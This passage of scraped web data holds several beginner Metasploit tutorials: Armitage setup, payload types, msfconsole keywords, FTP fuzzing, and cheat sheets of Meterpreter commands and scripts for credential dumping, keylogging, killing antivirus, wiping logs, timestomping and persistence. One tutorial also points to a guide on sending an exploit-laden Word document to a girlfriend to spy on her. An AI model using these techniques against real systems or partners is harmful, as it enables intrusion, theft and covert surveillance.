        "content": "* WonderHowTo\nWelcome back, my hacker novitiates!\nAs you know by now, the Metasploit Framework is one of my favorite hacking tools. It is capable of embedding code into a remote system and controlling it, scanning systems for recon, and fuzzing systems to find buffer overflows. Plus, all of this can be integrated into Rapid7's excellent vulnerability scanner Nexpose.\nMany beginners are uncomfortable using the interactive msfconsole and probably will be without a significant amount of hours spent using Metasploit. However, Metasploit does have other means of controlling the system that make system exploitation a touch easier for those of you uncomfortable with the command line.\nFor those who are more comfortable using a graphical user interface (GUI), Raphael Mudge has developed one that connects to and controls Metasploit much like a Windows application. He calls it Armitage, and I've covered it briefly in my Metasploit primer guide. Especially for new, aspiring hackers, Armitage can make learning hacking with Metasploit a quicker and much less painful process.\nLet's take a look a Armitage and see how it can make hacking simpler.\nStep 1: Download Armitage\nThe first step, of course, is to download Armtage. If you have BackTrack or the early versions of Kali, you probably don't have Armitage, but you can get it from Armitage's website.\nClick on the download button and it will pull up the following webpage. Make certain that you download the Linux version.\nAnother download option includes using the command line tool aptitude. Just type the following to install it.\n* kali apt-get install armitage\nIn addition, you can also use the GUI-based tool in Kali, the \"Add/Remove Software,\" and search for \"Armitage.\"\nStep 2: Start Metasploit\nOnce you have Armitage downloaded onto your system, the next step is to start Matsploit. Make certain the postgreSQL server is started by typing:\n* kali > service postgresql start\nNow, start Metasploit by typing:\n* kali > msfconsole\nStep 3: Start Armitage\nArmitage uses a client/server architecture where Metasploit is the server and Armitage is the client. In essence, Armitage is a GUI client that I can interact and control the Metasploit server.\nStart Armitage in Kali by typing:\n* kali > armitage\nWhen you do so, you will see the following screen.\nIf you are running Metasploit from your \"home\" system, leave these default setting and click \"Connect.\" If you want to run Armitage on a remote system, simply put the IP address of the system running Metasploit in the window asking you for the \"Host.\"\nStep 4: Start the RPC Server\nArmitage connects to an RPC server in order to control Metasploit. You are likely to see the following screen after starting Armitage.\nIn some cases, it make take awhile to connect, such as in the screen below.\nWhen Armitage finally connects to Metasploit's RPC server, you will greeted with the following screen.\nSuccess! You are now running Metasploit from an easy to use GUI.\nStep 5: Explore Armitage\nNotice in the upper left-hand corner of the Armitage screen, you can see folders. These folders contain four types of Metasploit modules;\n1. auxiliary\nIf you have read my earlier Metasploit tutorials, you know that this is how Metasploit organizes its modules. For the beginner, the exploit and payload modules are the most important.\nWe can expand the exploit modules directory by clicking on the arrow head to its right. When we do so, it expands and show us its contents.\nIt categorizes the exploits by the type of operating system (OS) they are designed for, such as Windows, BSD, Linux, Solaris, etc. Remember, exploits are specific to an operating system, an application, ports, services, and sometimes even the language. If we scroll to the Windows subdirectory and expand it, we see all the Windows exploits categorized by type.\nNow, when we are looking for an exploit to use on a particular system with a particular vulnerability, we can simply point and click to find it.\nStep 6: Hail Mary!\nNearly everything you can do with the Metasploit console, you can with Armitage. There is one thing though that you do with Armitage that you cannot do with msfconsole (at least without scripting). That one thing is to throw the Hail Mary! The Hail Mary is where Armitage will throw every exploit it has against a site to see whether any of them work.\nSimply go to the \"Attacks\" menu at the top of Armitage and select \"Hail Mary.\" When you click on it it warns you like in the screen below.\nThis wouldn't really be effective in a hacking environment as its far from stealthy. It will create so much \"noise\" on the target that you will likely be detected immediately, but in a lab or pentesting environment, it can be useful to try numerous attacks against a target a see which, if any, will work.\nArmitage enables the aspiring hacker to quickly grasp the basics of Metasploit hacking and begin to use this excellent and powerful tool in very short order. We all owe Raphael Mudge a debt of gratitude for developing and giving away this excellent piece of software!\nJust updated your iPhone? You'll find new features for Podcasts, News, Books, and TV, as well as important security improvements and fresh wallpapers. Find out what's new and changed on your iPhone with the iOS 17.5 update.",
        "category": "Metasploit Basics"
    },
    {
        "title": "Metasploit for the Aspiring Hacker, Part 3 (Payloads)",
        "link": "https://null-byte.wonderhowto.com/how-to/hack-like-pro-metasploit-for-aspiring-hacker-part-3-payloads-0157032/",
        "content": "* WonderHowTo\nWelcome back, my tenderfoot hackers!\nAs you know, Metasploit is an exploitation framework that every hacker should be knowledgeable of and skilled at. It is one of my favorite hacking tools available.\nMetasploit enables us to use pre-written exploits against known vulnerabilities in operating systems, browsers and other applications and place a rootkit/listener/payload on the target system. These payloads are what enable us to connect to the victim system and use it as our own after we have exploited a vulnerability in its system. In this tutorial, we will look exclusively at the payloads built into Metasploit.\nMetasploit has many types of payloads we can leave on the target system. We are most familiar with the generic/shell/reverse_tcp and the windows/meterpreter/reverse_tcp payloads, having used those in multiple hacks already. In this guide, we will look at such things as how the payloads work, how Metasploit categorizes the payloads, and what the types of payloads are. I hope this understanding will help you to better choose the appropriate payload for your hack.\nLet's take a closer look at these payloads in Metasploit.\nStep 1: Fire Up Kali Linux & Open Metasploit\nWhen we open the Metasploit console in Kali Linux, we immediately see that Metasploit lists the number of exploits, auxiliary modules, post exploitation modules, payload modules, encoders, and nops.\nIn the screenshot below, notice that there are 335 payloads in the current version of Metasploit (yours may be slightly different based upon your version of Metasploit). This is a huge number of payloads that can be used for multiple situations.\nWhen we type:\nMetasploit lists all 335 payloads as below.\nStep 2: Types of Payloads\nAmong these 335 payloads in Metasploit, there are 8 types of payloads.\nThese payloads are a single package of exploit and payload. They are inherently more stable, but because of their size, they can't always be used in small vulnerable memory areas.\nThese payloads essentially are able to fit into very small spaces and create a foothold on the system and then pull rest of the payload.\nMeterpreter\nIs the all powerful payload that we most often want on a victim system. It works by .dll injection and resides entirely in memory, leaving no trace of its existence on the hard drive or file system. It has a number of specific commands and scripts developed for it, enabling us to largely work our will on the victim system.\nThis payload is for use when firewall rules restrict outbound traffic. In essence, it uses ActiveX through Internet Explorer to hide its outbound traffic and evade the firewall by using HTTP requests and responds just as any browser would.\nIn some CPUs, there is a built-in security feature called DEP (Data Execution Prevention). In Windows, it is referred to as No eXecute, or NX. The idea behind this security feature is to keep from data making its way to the CPU and being executed. The NoNX payloads are designed to evade this safety feature of modern CPU's.\nThese type of payloads work on nearly all Windows operating systems. These are extremely small, but somewhat unstable. They are dependent upon loading a .dll (dynamic link library) into the exploited process.\nThese payloads, as their implies, are designed to work on IPv6 networks.\nReflective DLL Injection\nThese payload modules are injected directly into the target process while it is running in memory, thereby never writing anything to the hard drive and leaving little or no evidence behind.\nStep 3: Payload Modules\nIf we look in the Metasploit directory the Linux terminal in Kali, we can see that Metasploit categorizes its payloads into three different types. Obviously, the eight types above are consolidated into these three directories in Metasploit.\nkali > cd /usr/share/metasploit-framework/modules/payloadskali > ls -l\nStaged payloads use tiny stagers (see below) to fit into small exploitation spaces. In other words, if the victim's system exploitation buffer or other memory area is very small and only allows a small amount of code to be executed, first a small stager is placed in the memory area. The stager then \"pulls\" the rest of the payload after this foothold is made on the victim system.\nThese larger staged payloads include such complex payloads as the Meterpreter and VNC Injection, both of which include large and complex code. Generally, a staged payload will split the name of the payload between a \"/\", such as in the payload windows/shell/tcp_bind. The \"tcp_bind\" is the stager (see below) and \"shell\" is the staged.\nUnfortunately, this convention is not used consistently in Metasploit, so one often has to go to the \"info\" section of the payload or find the directory it is in to determine if it is a staged payload.\nStagers are the small payloads whose only job is to fit into small memory area and then \"pull\" the larger staged payload along. They kind of \"plant the flag\" on the victim and then enable the larger payload to be loaded.\nOften referred to as \"inline payloads,\" singles are self-contained units that do not require a stager. They are generally more stable and preferred, but many times the code is too large to for the vulnerable memory area on the victim system.\nLet's now take a look inside that singles directory.\nkali > cd singleskali > ls -l\nAs we can see, the singles are broken down by vulnerable platform. If we want to see the singles available for the Windows platform, we simply type:\nkali > cd windowskali > ls -l\nInside this directory we can see all the singles payloads available for Windows. I have highlighted one of these payloads, shell_reverse_tcp, that we have used in many of our hacks.\nPayloads are key part of the Metasploit infrastructure and provide us with access once the exploit has been completed. The better we understand them, the better we will be as a hackers.\nThat's it for now. Make sure to check back in on my Metasploit Basics series for more tutorials on Metasploit. So, keep coming back, my tenderfoot hackers!\nJust updated your iPhone? You'll find new features for Podcasts, News, Books, and TV, as well as important security improvements and fresh wallpapers. Find out what's new and changed on your iPhone with the iOS 17.5 update.",
        "category": "Metasploit Basics"
    },
    {
        "title": "Metasploit for the Aspiring Hacker, Part 2 (Keywords)",
        "link": "https://null-byte.wonderhowto.com/how-to/hack-like-pro-metasploit-for-aspiring-hacker-part-2-keywords-0156696/",
        "content": "* WonderHowTo\nWelcome back, my rookie hackers!\nI recently began a series on using Metasploit, and my goal with it is to teach you the very basics the incredibly powerful hacking tool has to offer while progressively moving on to the more advanced features.\nIn my first Metasploit installment, I showed you the various ways you can use Metasploit, from the msfcli to the msfconsole to the GUI-based Armitage. In addition, I gave an overview of the various modules, including exploits, payloads, and encoders. Finally, we looked at some of the basic searching capabilities built right into Metasploit to help you find specific exploits, payloads, post-exploitation modules, scanners, encoders, etc.\nIn this second tutorial, we will look at some of the basic commands we can use in Metasploit. Although the Metasploit framework can appear daunting to the uninitiated, it is actually a very simply framework for system exploitation. If you can learn a few keywords and techniques, you can use Metasploit to hack just about any system.\nMetasploit Keywords\nUndersatnding and using a few keywords in Metasploit can help you navigate and operate this powerful piece of software. Let's look a few of the most basic and necessary Metasploit commands. This is far from an exhaustive list of Metasploit keywords and commands, but it covers the basic commands you need to function in Metasploit until you gain more experience.\nIf you already have a little experience in Metasploit and want commands for the meterpreter, check out my meterpreter commands cheat sheet.\n\"Show\" is one of the most basic commands in Metasploit. It can be used to show modules, such as show payloads, show exploits, etc. But, it also can be used to show options once we have an exploit chosen.\nThe \"show\" command becomes context sensitive when we choose an exploit, so that if we type \"show payloads\" before selecting an exploit, it will show us ALL the payloads. If we type \"show payloads\" after selecting an exploit, it will only show us the payloads that will work with that exploit.\nFor instance, when we want see all the options that we need to set when installing a backdoor with an innocent-looking PDF, we use the \"show options\" command as below.\nThe \"help\" command will give you a limited list of commands you can use in msfconsole. If you lose this guide, simply type \"help\" to get some basic commands.\n\"Info\" is another basic command in Metasploit that enables us to see all the basic information about an exploit. After selecting an exploit, we can then type \"info\" and it will display all of the options, targets, and a description for the exploit. I prefer to type \"info\" on any exploit I am using to find or remind myself of its features and requirements.\nFor instance, here is screenshot from the output from the \"info\" command when using the ftp auxiliary module.\n\"Set\" is a basic and critical command/keyword in Metasploit. We can use it to set parameters and variables necessary to run the exploit. These variables can include the payload, the RHOST, the LHOST, the target, URIPATH, etc.\nIn the screenshot below from my tutorial on using psexec to hack a system, we set RHOST, LHOST, SMBUser, and the SMBPass to hack the system without leaving a trace.\nWhen we are done working with a particular module or we chose the wrong module, we can use the \"back\" command to return to the msfconsole prompt.\nFor instance, if we chose an exploit and then realized we chose the wrong one, we can simply type \"back\" and then use the \"use\" command (see next section) to select another module.\nWhen we have decided which exploit we want to use against our target system, we use the \"use\" command to load that exploit into memory and ready it to send to the target system. An example can be found in my tutorial on using the Heartbleed vulnerability to grab information in memory from systems running OpenSSL.\nAfter choosing our exploit, setting all of our variables, and choosing our payload, the last thing we do is to type the \"exploit\" command. This launches the exploit against the target machine with the payload and any variables we might have set.\nAn example of this can be found in my guide on creating an exploit in an innocent-looking Word doc and sending it to your girlfriend to see whether or not she is cheating.\n8. Sessions\nThe \"sessions\" command is used to list or set a session. When used with the -l (list) switch, it will list all open sessions. When used with a number (\"sessions -1\"), it tells Metasploit to activate the first session.\nMetasploit allows us to run multiple sessions on the same system or multiple sessions on multiple systems. Using the \"sessions\" command, we can find these open sessions and switch to or activate them.\nYou can find an example of this in my guide on creating an auto-reconnecting persistent backdoor on the target system, as seen below.\nWhen we want to leave the msfconsole, we can simply type \"exit\" to return to our Linux shell.\nThis should provide you with a basic command set that will enable you to run just about any hack in Metasploit. In future tutorials, we will look at the types of payloads, advanced commands, using global variables, advanced Meterpreter techniques, and ultimately, developing our own exploit.\nKeep coming back, my rookie hackers!\nJust updated your iPhone? You'll find new features for Podcasts, News, Books, and TV, as well as important security improvements and fresh wallpapers. Find out what's new and changed on your iPhone with the iOS 17.5 update.",
        "category": "Metasploit Basics"
    },
    {
        "title": "Metasploit for the Aspiring Hacker, Part 1 (Primer & Overview)",
        "link": "https://null-byte.wonderhowto.com/how-to/hack-like-pro-metasploit-for-aspiring-hacker-part-1-primer-overview-0155986/",
        "content": "* WonderHowTo\nWelcome back, my tenderfoot hackers!\nI have written many tutorials on hacking using Metasploit, including leaving no evidence behind and exploring the inner architecture. Also, there are my Metasploit cheat sheets for commands and hacking scripts.\nWith this guide, I'm starting a sequential and cumulative series for learning and using Metasploit. This first part will cover the very basics of Metasploit for those of you who are new to Null Byte, and as a refresher for those of you who are not. With that in mind, this will be quick and dirty first lesson on using one of the most powerful hacking platforms on planet Earth.\nMetasploit Background & Installation\nMetasploit was developed by HD Moore as an open source project in 2003. Originally written in Perl, Metasploit was completely rewritten in Ruby in 2007. In 2009, it was purchased by Rapid7, an IT security company that also produces the vulnerability scanner Nexpose.\nMetasploit is now in version 4.9.3, which is included in our Kali Linux. It's also built into BackTrack. For those of you using some other version of Linux or Unix (including Mac OS), you can download Metasploit from Rapid7's website.\nFor those of you using Windows, you can also grab it from Rapid7, but I do not recommend running Metasploit in Windows. Although you can download and install it, some of the capabilities of this hacking framework do not translate over to the Windows operating system, and many of my hacks here on Null Byte will not work on the Windows platform.\nMetasploit now has multiple products, including Metasploit Pro (the full commercial version) and the Community edition that is built into Kali and remains free. We will focus all of our efforts on the Community edition, as I am well aware that most of you will not be buying the $30,000 Pro edition.\nWays to Use Metasploit\nMetasploit can be accessed or used in multiple ways. The most common method, and the one I use, is the interactive Metasploit console. This is the one that is activated by typing msfconsole at the command line in Kali. There are several other methods as well.\nFirst, you can use Metasploit from the command line, or in msfcli mode. Although it appears that when we are in the console that we are using the command line, we are actually using an interactive console with special keywords and commands. From the msfcli, we ARE actually using a Linux command line.\nWe can get the help screen for msfcli by typing:\nkali > msfcli -h\nNow to execute an exploit from the msfcli, the syntax is simply:\nkali > msfcli <the exploit> payload = <the payload> rhost = <IP> lhost = <IP> E\nWhere E is short for execute.\nIn my tutorial on creating payloads to evade AV software, we are using the msfencode and msfpayload command in the command line (msfcli) mode.\nThe drawback to using the msfcli is that it is not as well-supported as the msfconsole, and you are limited to a single shell, making some of the more complex exploits impossible.\nIf you want to use Metasploit with a GUI (graphical user interface), at least a couple of options are available. First, Raphael Mudge has developed the Armitage (presumably a reference to a primary character in the seminal cyberhacking science fiction work, Neuromancer—a must read for any hacker with a taste for science fiction).\nTo start Armitage in Kali, simply type:\nkali > armitage\nIf Armitage fails to connect, try these alternative commands:\nkali > service start postgresqlkali > service start metasploitkali > service stop metasploit\nArmitage is a GUI overlay on Metasploit that operates in a client/server architecture. You start Metasploit as a server and Armitage becomes the client, thereby giving you full access to Metasploit's features through a full featured—thought not completely intuitive—GUI. If you really need a GUI to feel comfortable, I don't want to discourage you from using Armitage, but mastering the command line is a necessity for any self-respecting hacker.\nMetasploit has six different types of modules. These are:\n1. payloads",
        "category": "Metasploit Basics"
    },
    {
        "title": "Exploring Metasploit Auxiliary Modules (FTP Fuzzing)",
        "link": "https://null-byte.wonderhowto.com/how-to/hack-like-pro-exploring-metasploit-auxiliary-modules-ftp-fuzzing-0155574/",
        "content": "Each of these directories include programs or scripts that enable us to fuzz a particular protocol or function. We will focus our attention on ftp fuzzing in this tutorial.\nStep 5: Open the Fuzzers\nLet's look inside the ftp fuzzing directory:\nkali > cd ftpkali > ls -l\nAs you can see, there are two fuzzers for ftp, the client_ft.rb and the ftp_pre_post.rb. Let's use the ftp_pre_post.\nStep 6: Use the FTP Pre Post Fuzzer\nNow that we have identified an auxiliary module we want to use, let's open the msfconsole and find and use this module. Open the msfconsole by typing msfconsole in any directory from a terminal. This will open up the msfconsole and provide us with an msf prompt.\nTo find the fuzzer modules in Metasploit, we can use the search function built into msfconsole. We can type:\nmsf > search type:auxiliary fuzzers\nHere we are asking msfconsole to list us only those modules that are auxiliary (type:auxiliary) and contain the keyword, ftp.\nThe results of that search are listed above. I have highlighted in the screenshot the module we will be using, auxiliary/fuzzers/ftp/ftp_pre_post.\nStep 7: Load the Fuzzer Module\nTo load the module, simply type:\nmsf > use auxiliary/fuzzers/ftp/ftp_pre_post\nLet's take a look at the particulars of this module by looking at its info page.\nAlthough this module has many options, to run it we only need to provide a target IP address. In this case, we will run it against a Windows 2003 server with IIS 6.0 and an FTP server. Let's set the IP address:\nmsf > set RHOSTS 191.168.89.191\nAfter setting the target IP address, we then only need to run this ruby script.\nAs we can see above, the fuzzer begins by running random input set to size 10 bytes and increments the size by 10 each attempt. The default setting runs to size 20,000, but we can change that to any value that we find appropriate.\nAfter attempting random input, it then begins to attempt various command inputs once again beginning at 10 bytes and incrementing by 10 to 20,000 bytes. It will stop when it finds two error messages or comes to the end of all of its attempts. Just a warning, this can take hours.\nKeep coming back, my hacker novitiates, as we explore more Metasploit auxiliary modules and use them to find unknown vulnerabilities and progress toward developing our own zero-day exploits.\nCover image via Hack a Week",
        "category": "Metasploit Basics"
    },
    {
        "title": "Exploring the Inner Architecture of Metasploit",
        "link": "https://null-byte.wonderhowto.com/how-to/hack-like-pro-exploring-inner-architecture-metasploit-0151006/",
        "content": "* WonderHowTo\nWelcome back, my novice hackers!\nWe've done a number of tutorials using one of my favorite hacking tools, Metasploit. In each of them, we've used the msfconsole, which can be reached through either the menu system or through simply typing \"msfconsole\" from the terminal.\nThis msfconsole puts us into an interactive mode command prompt with the Metasploit Framework. This is my favorite way to use Metasploit, but certainly not the only way that is available to us.\nMetasploit has multiple ways of accessing its power and tools including a command line (msfcli), a GUI (armitage), and a web-based (msfweb). In this tutorial, we're going on a tour of Metasploit to introduce you to the inner structure and some new capabilities of Metasploit.\nStep 1: Open a Terminal & Find the Directory\nIn each of my previous tutorials, we've started from the interactive mode of Metasploit (the msfconsole). This time, however, let's go to the Metasploit directory directly so that we can explore its structure. We can get there by typing:\nbt > cd /pentest/exploits/framework\nStep 2: Look Around Inside the Framework\nNow that we're in the Metasploit Framework directory, let's take a look around. First, let's do a listing on this directory.\nIf you look to the top of this long listing, you will see a directory called armitage. This is a GUI for driving Metasploit that we'll return to in another tutorial.\nAlso note near the bottom a directory called scripts. This includes, among other things, meterpreter scripts such as key_scan that enables us to run a keylogger on the victim's computer.\nAlso note the following files—msfcli, the command line version of Metasploit, and msfencode, the command we used previously to re-encode a payload to get past antivirus software.\nStep 3: Explore the Modules\nLet's now explore the Metasploit modules. These are the blood and guts of Metasploit. We have, for instance, used \"exploit\" modules and \"payload\" modules. This is where they reside. Type in:\ncd modulesls -l\nAs you can see from the screenshot above, Metasploit contains multiple modules. These include:\n* auxiliary",
        "category": "Metasploit Basics"
    },
    {
        "title": "The Ultimate List of Hacking Scripts for Metasploit's Meterpreter",
        "link": "https://null-byte.wonderhowto.com/how-to/hack-like-pro-ultimate-list-hacking-scripts-for-metasploits-meterpreter-0149339/",
        "content": "* WonderHowTo\nWelcome back, my hacker apprentices!\nMetasploit framework is an incredible hacking and pentesting tool that every hacker worth their salt should be conversant and capable on.\nIn a previous post, I had provided you a cheat sheet of meterpreter commands. These commands are essential to running Metasploit's meterpreter, but in recent years, numerous hackers and security pros have developed scripts that we can run from the meterpreter that can be much more effective and malicious.\nIn this post, I will try to provide you the most complete list and description available anywhere on the web. You will want to bookmark this page too, as no one remembers all these scripts and it's likely you will want to return here at a later time to find a particular script for a particular hack.\nPlease note that new meterpreter scripts are being developed every day. This list attempts to provide you with a complete list of scripts as of this writing. If you find errors or typos, please feel free to post them here, so I will try correct them as soon as humanly possible.\nScript Commands with Brief Descriptions\n* arp_scanner.rb - Script for performing an ARP's Scan Discovery.\n* autoroute.rb - Meterpreter session without having to background the current session.\n* checkvm.rb - Script for detecting if target host is a virtual machine.\n* credcollect.rb - Script to harvest credentials found on the host and store them in the database.\n* domain_list_gen.rb - Script for extracting domain admin account list for use.\n* dumplinks.rb - Dumplinks parses .lnk files from a user's recent documents folder and Microsoft Office's Recent documents folder, if present. The .lnk files contain time stamps, file locations, including share names, volume serial #s and more. This info may help you target additional systems.\n* duplicate.rb - Uses a meterpreter session to spawn a new meterpreter session in a different process. A new process allows the session to take \"risky\" actions that might get the process killed by A/V, giving a meterpreter session to another controller, or start a keylogger on another process.\n* enum_chrome.rb - Script to extract data from a chrome installation.\n* enum_firefox.rb - Script for extracting data from Firefox. enum_logged_on_users.rb - Script for enumerating current logged users and users that have logged in to the system. enum_powershell_env.rb - Enumerates PowerShell and WSH configurations.\n* enum_putty.rb - Enumerates Putty connections.\n* enum_shares.rb - Script for Enumerating shares offered and history of mounted shares.\n* enum_vmware.rb - Enumerates VMware configurations for VMware products.\n* event_manager.rb - Show information about Event Logs on the target system and their configuration.\n* file_collector.rb - Script for searching and downloading files that match a specific pattern.\n* get_application_list.rb - Script for extracting a list of installed applications and their version.\n* getcountermeasure.rb - Script for detecting AV, HIPS, Third Party Firewalls, DEP Configuration and Windows Firewall configuration. Provides also the option to kill the processes of detected products and disable the built-in firewall.\n* get_env.rb - Script for extracting a list of all System and User environment variables.\n* getfilezillacreds.rb - Script for extracting servers and credentials from Filezilla.\n* getgui.rb - Script to enable Windows RDP.\n* get_local_subnets.rb - Get a list of local subnets based on the host's routes.\n* get_pidgen_creds.rb - Script for extracting configured services with username and passwords.\n* gettelnet.rb - Checks to see whether telnet is installed.\n* get_valid_community.rb - Gets a valid community string from SNMP.\n* getvncpw.rb - Gets the VNC password.\n* hashdump.rb - Grabs password hashes from the SAM.\n* hostedit.rb - Script for adding entries in to the Windows Hosts file.\n* keylogrecorder.rb - Script for running keylogger and saving all the keystrokes.\n* killav.rb - Terminates nearly every antivirus software on victim.\n* metsvc.rb - Delete one meterpreter service and start another.\n* migrate - Moves the meterpreter service to another process.\n* multicommand.rb - Script for running multiple commands on Windows 2003, Windows Vistaand Windows XP and Windows 2008 targets.\n* multi_console_command.rb - Script for running multiple console commands on a meterpreter session.\n* multi_meter_inject.rb - Script for injecting a reverce tcp Meterpreter Payload into memory of multiple PIDs, if none is provided a notepad process will be created and a Meterpreter Payload will be injected in to each.\n* multiscript.rb - Script for running multiple scripts on a Meterpreter session.\n* netenum.rb - Script for ping sweeps on Windows 2003, Windows Vista, Windows 2008 and Windows XP targets using native Windows commands.\n* packetrecorder.rb - Script for capturing packets in to a PCAP file.\n* panda2007pavsrv51.rb - This module exploits a privilege escalation vulnerability in Panda Antivirus 2007. Due to insecure permission issues, a local attacker can gain elevated privileges.\n* persistence.rb - Script for creating a persistent backdoor on a target host.\n* pml_driver_config.rb - Exploits a privilege escalation vulnerability in Hewlett-Packard's PML Driver HPZ12. Due to an insecure SERVICE_CHANGE_CONFIG DACL permission, a local attacker can gain elevated privileges.\n* powerdump.rb - Meterpreter script for utilizing purely PowerShell to extract username and password hashes through registry keys. This script requires you to be running as system in order to work properly. This has currently been tested on Server 2008 and Windows 7, which installs PowerShell by default.\n* prefetchtool.rb - Script for extracting information from windows prefetch folder.\n* process_memdump.rb - Script is based on the paper Neurosurgery With Meterpreter.\n* remotewinenum.rb - This script will enumerate windows hosts in the target environment given a username and password or using the credential under which Meterpeter is running using WMI wmic windows native tool.\n* scheduleme.rb - Script for automating the most common scheduling tasks during a pentest. This script works with Windows XP, Windows 2003, Windows Vista and Windows 2008.\n* schelevator.rb - Exploit for Windows Vista/7/2008 Task Scheduler 2.0 Privilege Escalation. This script exploits the Task Scheduler 2.0 XML 0day exploited by Stuxnet.\n* schtasksabuse.rb - Meterpreter script for abusing the scheduler service in Windows by scheduling and running a list of command against one or more targets. Using schtasks command to run them as system. This script works with Windows XP, Windows 2003, Windows Vista and Windows 2008.\n* scraper.rb - The goal of this script is to obtain system information from a victim through an existing Meterpreter session.\n* screenspy.rb - This script will open an interactive view of remote hosts. You will need Firefox installed on your machine.\n* screen_unlock.rb - Script to unlock a windows screen. Needs system privileges to run and known signatures for the target system.\n* screen_dwld.rb - Script that recursively search and download files matching a given pattern.\n* service_manager.rb - Script for managing Windows services.\n* service_permissions_escalate.rb This script attempts to create a service, then searches through a list of existing services to look for insecure file or configuration permissions that will let it replace the executable with a payload. It will then attempt to restart the replaced service to run the payload. If that fails, the next time the service is started (such as on reboot) the attacker will gain elevated privileges.\n* sound_recorder.rb - Script for recording in intervals the sound capture by a target host microphone.\n* srt_webdrive_priv.rb - Exploits a privilege escalation vulnerability in South River Technologies WebDrive.\n* uploadexec.rb - Script to upload executable file to host.\n* virtualbox_sysenter_dos - Script to DoS Virtual Box.\n* virusscan_bypass.rb - Script that kills Mcafee VirusScan Enterprise v8.7.0i+ processes.\n* vnc.rb - Meterpreter script for obtaining a quick VNC session.\n* webcam.rb - Script to enable and capture images from the host webcam.\n* win32-sshclient.rb - Script to deploy & run the \"plink\" commandline ssh-client. Supports only MS-Windows-2k/XP/Vista Hosts.\n* win32-sshserver.rb - Script to deploy and run OpenSSH on the target machine.\n* winbf.rb - Function for checking the password policy of current system. This policy may resemble the policy of other servers in the target environment.\n* winenum.rb - Enumerates Windows system including environment variables, network interfaces, routing, user accounts, etc\n* wmic.rb - Script for running WMIC commands on Windows 2003, Windows Vista and Windows XP and Windows 2008 targets.\nJust updated your iPhone? You'll find new features for Podcasts, News, Books, and TV, as well as important security improvements and fresh wallpapers. Find out what's new and changed on your iPhone with the iOS 17.5 update.",
        "category": "Metasploit Basics"
    },
    {
        "title": "The Ultimate Command Cheat Sheet for Metasploit's Meterpreter",
        "link": "https://null-byte.wonderhowto.com/how-to/hack-like-pro-ultimate-command-cheat-sheet-for-metasploits-meterpreter-0149146/",
        "content": "* WonderHowTo\nI've done numerous tutorials in Null Byte demonstrating the power of Metasploit's meterpreter. With the meterpreter on the target system, you have nearly total command of the victim.\nAs a result, several of you have asked me for a complete list of commands available for the meterpreter because there doesn't seem to be a complete list anywhere on the web. So here it goes. Hack a system and have fun testing out these commands.\nStep 1: Core Commands\nAt its most basic use, meterpreter is a Linux terminal on the victim's computer. As such, many of our basic Linux commands can be used on the meterpreter even if it's on a Windows or other operating system. Here are some of the core commands we can use on the meterpreter:\n?               help menu\nbackground      moves the current session to the background\nbgkill          kills a background meterpreter script\nbglist          provides a list of all running background scripts\nbgrun           runs a script as a background thread\nchannel         displays active channels\nclose           closes a channel\nexit            terminates a meterpreter session\nexploit         executes the meterpreter script designated after it\nhelp            help menu\ninteract        interacts with a channel\nirb             go into Ruby scripting mode\nmigrate         moves the active process to a designated PID\nquit            terminates the meterpreter session\nread            reads the data from a channel\nrun             executes the meterpreter script designated after it\nuse             loads a meterpreter extension\nwrite           writes data to a channel\nStep 2: File System Commands\ncat             read and output to stdout the contents of a file\ncd              change directory on the victim\ndel             delete a file on the victim\ndownload        download a file from the victim system to the attacker system\nedit            edit a file with vim\ngetlwd          print the local directory\ngetwd           print working directory\nlcd             change local directory\nlpwd            print local directory\nls              list files in current directory\nmkdir           make a directory on the victim system\npwd             print working directory\nrm              delete (remove) a file\nrmdir           remove directory on the victim system\nupload          upload a file from the attacker system to the victim\nStep 3: Networking Commands\nipconfig        displays network interfaces with key information including IP address, etc.\nportfwd         forwards a port on the victim system to a remote service\nroute           view or modify the victim routing table\nStep 4: System Commands\nclearev         clears the event logs on the victim's computer\ndrop_token      drops a stolen token\nexecute         executes a command\ngetpid          gets the current process ID (PID)\ngetprivs        gets as many privileges as possible\ngetuid          get the user that the server is running as\nkill            terminate the process designated by the PID\nps              list running processes\nreboot          reboots the victim computer\nreg             interact with the victim's registry\nrev2self        calls RevertToSelf() on the victim machine\nshell           opens a command shell on the victim machine\nshutdown        shuts down the victim's computer\nsteal_token     attempts to steal the token of a specified (PID) process\nsysinfo         gets the details about the victim computer such as OS and name\nStep 5: User Interface Commands\nenumdesktops    lists all accessible desktops\ngetdesktop      get the current meterpreter desktop\nidletime        checks to see how long since the victim system has been idle\nkeyscan_dump    dumps the contents of the software keylogger\nkeyscan_start   starts the software keylogger when associated with a process such as Word or browser\nkeyscan_stop    stops the software keylogger\nscreenshot      grabs a screenshot of the meterpreter desktop\nset_desktop     changes the meterpreter desktop\nuictl           enables control of some of the user interface components\nStep 6: Privilege Escalation Commands\ngetsystem       uses 15 built-in methods to gain sysadmin privileges\nStep 7: Password Dump Commands\nhashdump        grabs the hashes in the password (SAM) file\nNote that hashdump will often trip AV software, but there are now two scripts that are more stealthy, run hashdump and run smart_hashdump. Look for more on those in my meterpreter script cheat sheet.\nStep 8: Timestomp Commands\ntimestomp       manipulates the modify, access, and create attributes of a file\nStay Tuned for More Meterpreter Tips\nI've already used many of these commands in previous tutorials, and I will be using more in future guides as well to show you how they work. Also, bookmark this page as it is possibly the most complete cheat sheet of meterpreter commands found anywhere on the web, so you'll want it to refer back to this sheet often.\nFinally, check out my second meterpreter cheat sheet with the 135 scripts available for the meterpreter to continue hacking with metasploit.",
        "category": "Metasploit Basics"
    },
    {
        "title": "Play Wi-Fi Hacking Games Using Microcontrollers to Practice Wi-Fi Attacks Legally",
        "link": "https://null-byte.wonderhowto.com/how-to/play-wi-fi-hacking-games-using-microcontrollers-practice-wi-fi-attacks-legally-0238563/",
